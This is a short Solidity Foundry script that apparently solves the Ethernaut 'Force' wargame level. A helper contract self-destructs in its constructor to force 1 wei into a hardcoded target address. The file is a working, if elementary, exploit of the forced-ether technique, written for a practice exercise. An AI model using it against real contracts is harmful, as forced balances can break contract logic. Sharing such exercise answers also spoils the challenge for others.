// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ToBeDestructed {
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}

contract ForceSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new ToBeDestructed{value: 1 wei}(payable(0x0587f01B578A3f3b622cbD82d2678a21572da511));
        vm.stopBroadcast();
    }
}